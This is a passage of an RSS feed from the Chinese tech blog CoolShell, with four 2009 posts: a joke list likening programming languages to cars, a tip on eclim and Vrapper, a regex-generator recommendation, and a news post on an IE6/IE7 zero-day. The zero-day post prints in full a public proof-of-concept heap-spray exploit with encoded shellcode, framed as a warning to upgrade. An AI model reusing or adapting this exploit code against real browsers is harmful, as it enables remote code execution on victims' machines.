+					<description><![CDATA[<p>以前酷壳发布过《操作系统航空公司》戏谑了一下如果操作系统是航空公司会怎么样的一种情况。现在，我们来YY一下编程语言，如果编程语言是汽车，又会怎么样？ Ada  ...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1839.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1839.html">编程语言汽车</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><strong><img decoding="async" loading="lazy" class="alignright" title="Oscar Mayer Wienermobile" src="https://coolshell.cn/wp-content/uploads/2009/11/oscar-meyer-wienermobile.jpg" alt="Oscar Mayer Wienermobile" width="225" height="167" /></strong>以前酷壳发布过《<a rel="bookmark" href="https://coolshell.cn/articles/1272.html">操作系统航空公司</a>》戏谑了一下如果操作系统是航空公司会怎么样的一种情况。现在，我们来YY一下编程语言，如果编程语言是汽车，又会怎么样？</p>
+<li><strong>Ada</strong>   这是一辆坦克。一个很厚重但很丑的坦克，从不会崩溃。如果你告诉别人你正在驾驶Ada，别人会狂笑不已。但是，你会开着一辆跑车去打战吗？[from Amit Dubey]</li>
+<li><strong>汇编语言</strong>   只是一个祼露在外的引擎。你不得不自己去造车，并向其提供汽油，但你在驾车时要小心，因为他会像一只从地狱放出来的蝙蝠一样。其实，对于汇编语言，你自己才是车。[From &#8220;Subterfug&#8221; off digg.com:]</li>
+<li><strong>Basic</strong>   是一辆很简单的车，对于一些短途的交通比如去一些超市商店，他是很有用的。以前这是一个对初学者很流行的车，然而，近来它蜕变成脚本，而更新的车型被抛光以应对长途旅程，但那也只是新瓶装旧酒。[from Przemyslaw Wrzos]</li>
+<li><strong>C</strong>   是一辆赛车，它的速度是令人难以想象的快，可惜的是它每50公里就会损毁一次。</li>
+<li><strong>Cobol</strong>   号称是一辆车，但是，没有哪个“有自尊的司机”会承认以前驾驶过它。</li>
+<li><strong>C#</strong>   是一个竞争性的家庭旅行车。一旦你开始使用，你就别想再使用别的竞争者的产品了。</li>
+<li><strong>C++</strong>   是一个加大马力的C赛车，其有一堆新增的功能，而且，它只会每250公里损毁一次。可是，一旦它有故障，没人会知道故障发生在哪里。</li>
+<p><span id="more-1839"></span></p>
+<li><strong>Eiffel</strong>   是一个车，其包括了一个法国口音的内建的驾驶讲师。他会帮你很快的识别你的错误，但是你不能和他争，不然，他会凌辱你后毫不迟疑地把你扔到窗外。[From Daniel Prager ]</li>
+<li><strong>Erlang</strong>   是一个汽车车队，你想去哪它都会非常合作。你只需要用一只脚就可以开动好几辆车。但是，一旦你学会了如何在它给你设计的地形上驾驶，你就会很难在别的地形上驾驶了。另外，由于你一次驾驶好几辆车，所以，就算是其中几车损毁了也无关紧要。</li>
+<li><strong>Forth</strong>   是一辆你通过一些工具可以自己造出来的车。你的这个车不需要像别的车。然后，一辆Forth 车只有倒档。[By &#8220;256byteram&#8221;, on a comment on Digg.com ]</li>
+<li><strong>Fortran</strong>   是一个非常漂亮的老爷车。它可以走得很快，但条件是那是一条很直的路，而且路上只有你自己。我们相信，学习去驾驶一辆Fortran车，你就可能去学习别的车型。</li>
+<li><strong>Java</strong>   也是一个家用旅行车，很容易驾驶，但不是很快，而且这是一个你无法伤害自己的车。</li>
+<li><strong>Haskell</strong>  是一个令人难以想象的超完美设计的相当漂亮的车，有谣言说，这是一辆要可以行驶在极端怪异地形上的车。有一天，你尝试着要去开它，但你发现它并不是顺着路行驶，而是，它把自己和道路都复制了很多份，每一个道路的复制品上都有一辆车，而这些车的位置都比前一个要往前一些。按理来说，我们可以更便捷地驾驶它，但你却对数据不是很懂，所以，你不知道怎么做。<br />
+[Monadic 版:]<strong>Haskell</strong>  并不是一个真正的车。这是一个抽象机器，你需要给足你是怎么去驾驶汽车的流程描述。你不得不把这些抽象机器放到某一个真实的机器中，这样它才能真正的行驶。你并不需要知道，那个真实的机器是怎么工作的。而且，我们还可以把多个抽象机器作成一个抽象机器，这样，当你把其放进真实机器中时，你就能去很多地方了。</li>
+<li><strong>Lisp</strong>  看上去像一辆车，但你只需要调整，你可把它变成一个飞机或是一个潜水艇。[from Paul Tanimoto:] 首先，这看起来并不像一辆车，但是你会发现还是有人在开他四处走。在你决定去学习驾驶它后，你会意识到这是一辆你可以制造更多的车的车。你告诉你的朋友，但你的朋友们嘲笑你说这个车看起来太怪异了。但就算是这样，你还是始终在你的车库中放着一辆Lisp，并希望有一天你的朋友会开关他到街上。</li>
+<li><strong>Mathematica</strong>   是一个设置精良的车，其从Lisp借鉴了很多但却没有得到应得的声望。它可以知道什么才是到达目的地最有效的道路，但是那需要运气。</li>
+<li><strong>Matlab</strong>   是一辆设计给新手司机使用的车，它过可用作一些短途用途，而且，适合它的地形也不多，和是那些“数学车”适合的地形差不多。在这种地面上，驾驶它是非常舒服的，但是一旦你离开适合它的地形，就算是一小辆Matlab的车也会变得很难驾驶。而很多专业的司机都拒绝承认这是一辆车。</li>
+<li><strong>Ocaml</strong>   是一个很性感的欧洲车。它并不像 <strong>C </strong>一样的快，但他永远不会被损毁。然后，这是法国式的，所有的控制装置都不在正常的位置。</li>
+<li><strong>Perl</strong>   本来应该是一个很酷的车，但是它的驾驶员手册相当的难以理解。另外，即使你能搞懂如何驾驶Perl车，你也不能去驾驶别的车。</li>
+<li>
+<p style="TEXT-ALIGN: left"><strong>PHP</strong>   是一个 Oscar Mayer Wienermobile（见本文文章头上的图片），它是一个很怪异的车，但是还是有很多的人喜欢去驾驶它。 [from &#8220;CosmicJustice&#8221; off of digg.com]</p>
+</li>
+<li><strong>Prolog</strong>   是一个完全自动化的车：你只要告诉它目的地是什么样的，它就可以带着你去那。[附录 from Paul Graham:] 然而，说明目的地的工作量和你自己开车到那里的工作时是一样的。[另一个版本] <strong>Prolog</strong>   这个车有一个独一无二的GPS装置。它会去为你寻找你要到的目的地，如果到了路的尽头还没有找到，那么，他会回来然后再去试另一条路，直到找到你的目的地为止。</li>
+<li><strong>Python</strong>   是一个相当不错的入门者的车。你没有驾照也可以驾驶它。除非，你真的想把它开得很快，或是在很BT的地形上驾驶。有了它，你可能不再需要别的车。</li>
+<li><strong>Ruby</strong>   是一个把Perl, Python和Smalltalk三辆车混合起来的一辆拼装车。一个日本的技师找到了Perl, Python和Smalltalk一些碎片并把这些碎片拼成成了一辆车。很多司机认为这个拼装车比其它三个全部加起来都好。而其它一些司机却喃喃道，这个车提供了很多重复的功能，甚至是三重一样的功能，这些重复的功能在不固定的环境下却又有一些细小的不同，这些重复的功能让这个车更难驾驶。有谣言说Ruby这个车要重新设计。</li>
+<li><strong>Smalltalk</strong>   只是一个小型车，其原来的目的只是为了让大家学习驾驶。但是，这个车设计的太好了，就算是很有经验的老手也很喜欢驾驶它。它开起来并不是很快，但是你可以把这个车的各个部件全部解开，并且换上你像要的部件，或是组装成你喜欢的样子。你可以给他发一个短信告诉它你要去哪，它会带着你去那，或是告诉你它听不懂你在说什么。很人性化的一辆车。</li>
+<li><strong>Visual Basic</strong>   这是一辆驾驭你的车。 [from &#8220;yivkX360&#8221; on digg.com]</li>
+<p> </p>
+<p>文章：<a href="http://www.cs.caltech.edu/~mvanier/hacking/rants/cars.html" target="_blank">来源</a><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/1532.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="到处都是Unix的胎记" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1532.html" class="wp_rp_title">到处都是Unix的胎记</a></li><li ><a href="https://coolshell.cn/articles/2529.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/6.jpg" alt="StackOverflow的404错误页" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2529.html" class="wp_rp_title">StackOverflow的404错误页</a></li><li ><a href="https://coolshell.cn/articles/10337.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="数据即代码：元驱动编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10337.html" class="wp_rp_title">数据即代码：元驱动编程</a></li><li ><a href="https://coolshell.cn/articles/7886.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/07/muxnt-150x150.jpg" alt="代码执行的效率" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7886.html" class="wp_rp_title">代码执行的效率</a></li><li ><a href="https://coolshell.cn/articles/2053.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/20.jpg" alt="最为奇怪的程序语言的特性" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2053.html" class="wp_rp_title">最为奇怪的程序语言的特性</a></li><li ><a href="https://coolshell.cn/articles/1992.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/12/language-fanboys-150x150.jpg" alt="程序员眼中的编程语言" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1992.html" class="wp_rp_title">程序员眼中的编程语言</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1839.html">编程语言汽车</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1839.html/feed</wfw:commentRss>
+			<slash:comments>23</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Eclipse 和 Vim</title>
+		<link>https://coolshell.cn/articles/1837.html</link>
+					<comments>https://coolshell.cn/articles/1837.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 23 Nov 2009 01:07:40 +0000</pubDate>
+				<category><![CDATA[编程工具]]></category>
+		<category><![CDATA[eclim]]></category>
+		<category><![CDATA[Eclipse]]></category>
+		<category><![CDATA[vim]]></category>
+		<category><![CDATA[vrapper]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1837</guid>
+
+					<description><![CDATA[<p>以前，neo和发布过如何在vim中得到你最喜爱的IDE特性，这是一篇在vim中装一些插件而让Vim拥有IDE的功能，比如代码自动提示等功能。当然，目前，可能强大...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1837.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1837.html">Eclipse 和 Vim</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>以前，neo和发布过<a rel="bookmark" href="https://coolshell.cn/articles/894.html">如何在vim中得到你最喜爱的IDE特性</a>，这是一篇在vim中装一些插件而让Vim拥有IDE的功能，比如代码自动提示等功能。当然，目前，可能强大最好用的IDE就是<a href="http://eclipse.org/">Eclipse</a>和，而最强大的编辑器又是<a href="http://vim.org/">Vim</a>了，可不可以让这两个东西合二为一呢。没有问题，开源社区的创造力永远不会让你低估。</p>
+<p>在Vim中拥有Eclipse的功能，在Eclipse里有Vim的功能，那么eclim是你的选择了。<a href="http://eclim.org/">http://eclim.org/</a> 相关的<a href="http://eclim.org/translations/zh_TW/vim/cheatsheet.html#translations-zh-tw-vim-cheatsheet" target="_blank">中文文档</a>。使用eclim，你可以在vim中有Eclipse的功能，也可以在Eclipse中嵌入Vim编辑器。很酷。</p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-3029" title="eclim" src="https://coolshell.cn/wp-content/uploads/2009/11/eclim.png" alt="" width="490" height="408" srcset="https://coolshell.cn/wp-content/uploads/2009/11/eclim.png 490w, https://coolshell.cn/wp-content/uploads/2009/11/eclim-300x250.png 300w, https://coolshell.cn/wp-content/uploads/2009/11/eclim-324x270.png 324w" sizes="(max-width: 490px) 100vw, 490px" /></p>
+<p style="text-align: left;"><span id="more-1837"></span></p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" src="http://eclim.org/_images/gvim_eclim_view.png" alt="_images/java_editor_eclim_view.png" width="696" height="519" /></p>
+<p>还有一个工具是<strong>Vrapper</strong>，这个工具是在Eclipse中使用Vim，你只需要在Eclipse的工具栏上点一下那个gvim的按钮就可以了。</p>
+<p><a href="http://vrapper.sourceforge.net/home/">http://vrapper.sourceforge.net/home/</a></p>
+<p style="text-align: center;"><img decoding="async" loading="lazy" class="alignnone" title="Vrapper" src="http://vrapper.sourceforge.net/img/toolbar_button.png" alt="" width="174" height="114" /></p>
+<p>（全文完）<a rel="bookmark" href="https://coolshell.cn/articles/894.html"></a><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/3181.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/10/EclipseCanoo1440x900-150x150.png" alt="Eclipse和Vim快捷键桌面" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3181.html" class="wp_rp_title">Eclipse和Vim快捷键桌面</a></li><li ><a href="https://coolshell.cn/articles/11312.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/03/success_vim-150x150.jpg" alt="无插件Vim编程技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11312.html" class="wp_rp_title">无插件Vim编程技巧</a></li><li ><a href="https://coolshell.cn/articles/8883.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/01/linux-bash-300x225-150x150.jpg" alt="应该知道的Linux技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8883.html" class="wp_rp_title">应该知道的Linux技巧</a></li><li ><a href="https://coolshell.cn/articles/7829.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/07/dstat_screenshot-150x150.png" alt="28个Unix/Linux的命令行神器" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7829.html" class="wp_rp_title">28个Unix/Linux的命令行神器</a></li><li ><a href="https://coolshell.cn/articles/7166.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/04/vimadventuresgamefun-150x150.jpg" alt="游戏：VIM大冒险" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7166.html" class="wp_rp_title">游戏：VIM大冒险</a></li><li ><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/09/image008-150x150.jpg" alt="一些文章和各种资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5224.html" class="wp_rp_title">一些文章和各种资源</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1837.html">Eclipse 和 Vim</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1837.html/feed</wfw:commentRss>
+			<slash:comments>18</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>IE6/IE7 0day 漏洞</title>
+		<link>https://coolshell.cn/articles/1835.html</link>
+					<comments>https://coolshell.cn/articles/1835.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Sun, 22 Nov 2009 16:52:14 +0000</pubDate>
+				<category><![CDATA[技术新闻]]></category>
+		<category><![CDATA[网络安全]]></category>
+		<category><![CDATA[0day]]></category>
+		<category><![CDATA[IE]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1835</guid>
+
+					<description><![CDATA[<p>昨天（2009年11月21日），Symantec发布了IE的一个0day安全漏洞的消息。关于这个消息，截止本文发布时，在中文社区里还没有报导。这是一个关于IE6...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1835.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1835.html">IE6/IE7 0day 漏洞</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script></p>
+<div>
+<p>昨天（2009年11月21日），Symantec发布了<a href="http://www.symantec.com/connect/blogs/zero-day-internet-explorer-exploit-published" target="_blank">IE的一个0day安全漏洞的消息</a>。关于这个消息，截止本文发布时，在中文社区里还没有报导。这是一个关于IE6/IE7处理CSS时的一个漏洞（<a href="https://coolshell.cn/articles/1817.html" target="_blank">关于IE和CSS的BUG</a>）。如果你目前还在使用IE6/IE7，那你现在可能是你升级的时候了，当然，有很多人说IE8是没有问题的，但我个人还是建议在补丁出来之前先使用Firefox或Chrome。</p>
+<p>根据Symantec的的报告，他们在第一时间内测试了那个“Exploit Code”（攻击代码），根据测试结果表时，那个JavaScript的攻击代码并不是100%的可靠，而且很不可靠，但安全专家相信，100%完全可靠的“攻击代码”将会马上出现。这意味着，这段攻击代码会马上如潮水一样地放在各个有恶意的网站上，然后，所有的IE6/IE7的，打开JavaScript的用户都会被危及。</p>
+<p>目前，这段攻击代码，虽然很不可靠，但已经被证明在IE6/IE7的 Windows XP SP3上是可靠的，目前还没有相关报告说明有多少台电脑中招了，但我相信，在过去的这个周末，一定有一些人在拼命地在改善这段攻击代码，他们要赶在相关的补丁出来之前。而Microsoft，相信他还是和以前一样，一定要等到攻击很广泛的时候才会开始真正把补丁提上日程。</p>
+<p>最后，说一下攻击代码，这个代码是在<a href="http://seclists.org/bugtraq/2009/Nov/148" target="_blank">Bugtraq邮件组</a>中，这段攻击代码如下所示，这段代码攻击性并不可靠。</p>
+<p><span id="more-1835"></span></p>
+<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;!--
+securitylab.ir
+K4mr4n_st () yahoo com
+--&gt;
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;
+&quot;&lt;a href=&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&lt;/a&gt;&quot;;&gt;
+&lt;HTML xmlns=&lt;a href=&quot;http://www.w3.org/1999/xhtml&quot;&gt;http://www.w3.org/1999/xhtml&lt;/a&gt;;&gt;
+    &lt;HEAD&gt;
+&lt;script&gt;  
+            function load(){
+                var e;
+                e=document.getElementsByTagName(&quot;STYLE&quot;)[0];
+                e.outerHTML=&quot;1&quot;;
+            }
+        &lt;/script&gt;    
+        &lt;STYLE type=&quot;text/css&quot;&gt;
+            body{ overflow: scroll; margin: 0; }
+        &lt;/style&gt;
+       
+        &lt;SCRIPT language=&quot;javascript&quot;&gt;
+var shellcode =
+unescape(&quot;%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063&quot;);
+var bigblock = unescape(&quot;%u9090%u9090&quot;);
+var headersize = 20;
+var slackspace = headersize+shellcode.length;
+while (bigblock.length&lt;slackspace) bigblock+=bigblock;
+fillblock = bigblock.substring(0, slackspace);
+block = bigblock.substring(0, bigblock.length-slackspace);
+while(block.length+slackspace&lt;0x40000) block = block+block+fillblock;
+memory = new Array();
+for (x=0; x&lt;4000; x++) memory[x] = block + shellcode;
+&lt;/script&gt;
+ 
+    &lt;/HEAD&gt;   
+    &lt;BODY onload=&quot;load()&quot;&gt;
+    &lt;/BODY&gt;
+&lt;/HTML&gt;</pre>
+<p> </p>
+</div>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/08/ajax_error-150x150.jpg" alt="一次Ajax查错的经历" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8170.html" class="wp_rp_title">一次Ajax查错的经历</a></li><li ><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/04/Green-Computing-150x150.jpg" alt="做个环保主义的程序员" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7186.html" class="wp_rp_title">做个环保主义的程序员</a></li><li ><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="10大经典错误" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a></li><li ><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/06/sina_xss01-150x150.png" alt="新浪微博的XSS攻击" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4914.html" class="wp_rp_title">新浪微博的XSS攻击</a></li><li ><a href="https://coolshell.cn/articles/3921.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/03/IE6-Countdown-150x150.png" alt="中国仍是IE6的重灾区" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3921.html" class="wp_rp_title">中国仍是IE6的重灾区</a></li><li ><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/03/affc-image1-150x150.png" alt="微软用新浪来当反面教材" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3872.html" class="wp_rp_title">微软用新浪来当反面教材</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1835.html">IE6/IE7 0day 漏洞</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1835.html/feed</wfw:commentRss>
+			<slash:comments>3</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>正则表达式生成器</title>
+		<link>https://coolshell.cn/articles/1830.html</link>
+					<comments>https://coolshell.cn/articles/1830.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 20 Nov 2009 01:12:17 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[编程工具]]></category>
+		<category><![CDATA[txt2re]]></category>
+		<category><![CDATA[正则表达式]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1830</guid>
+
+					<description><![CDATA[<p> 对正则表达式很头疼，是不是？每次看到都觉得像看天书似的，别说让人自己整一个出来了。下面这个网站可以帮你生成正则表达式，而且还可以根据不同的语言生成不同的代码示...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1830.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1830.html">正则表达式生成器</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><a href="http://www.txt2re.com/index.php3" target="_blank"></a> 对正则表达式很头疼，是不是？每次看到都觉得像看天书似的，别说让人自己整一个出来了。下面这个网站可以帮你生成正则表达式，而且还可以根据不同的语言生成不同的代码示例，很强大。</p>
+<p style="text-align: center;"><a href="http://www.txt2re.com/index.php3" target="_blank"><img decoding="async" loading="lazy" title="txt2re.com" src="https://coolshell.cn/wp-content/uploads/2009/11/txt2re.jpg" alt="txt2re.com" width="270" height="104" /></a></p>
+<p style="text-align: center;"><a href="http://www.txt2re.com/index.php3" target="_blank">http://www.txt2re.com/index.php3</a></p>
+<p style="text-align: left;">打开上面那个网页，你会看到有三步。</p>
+<ul>
+<li>
+<div style="text-align: left;">第一步，输出你想匹配的一个文本示例，然后点“Show Machted”，于是进入第二点。</div>
+</li>
+<li>
+<div style="text-align: left;">第二步，当你看到那花花绿绿的界面是不要头大（那个配色也太可怕了），那是这个会把你的这个字串每个字符都拆出来，并把单词分隔。于是，你可以点击那些花绿格子间的链接来组织你的正规表达式。，比如：c表示任意字符，还有什么int,day,string之流的东西。（相当ugly的界面）在这一步，你一点要点点什么，不然不会进入第三步。</div>
+</li>
+<li>
+<div style="text-align: left;">第三步，选择一个编程语言，然后你可以看到相关的代码示例。语言支持：Perl  PHP  Python  Java  Javascript  ColdFusion  C  C++  Ruby  VB  VBScript  J#.net  C#.net  C++.net  VB.net （这么多）</div>
+</li>
+</ul>
+<p style="text-align: left;">总之，这是一个很酷，但却界面很丑陋的在线的正则表达式生成工具。</p>
+<p style="text-align: left;"> </p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/2704.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/8.jpg" alt="检查素数的正则表达式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2704.html" class="wp_rp_title">检查素数的正则表达式</a></li><li ><a href="https://coolshell.cn/articles/2667.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/28.jpg" alt="浏览器正则表达式检查插件" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2667.html" class="wp_rp_title">浏览器正则表达式检查插件</a></li><li ><a href="https://coolshell.cn/articles/1387.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/29.jpg" alt="十个Web开发文章和教程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1387.html" class="wp_rp_title">十个Web开发文章和教程</a></li><li ><a href="https://coolshell.cn/articles/3136.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/3.jpg" alt="chmod -x chmod的N种解法" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3136.html" class="wp_rp_title">chmod -x chmod的N种解法</a></li><li ><a href="https://coolshell.cn/articles/737.html" class="wp_rp_thumbnail"><img 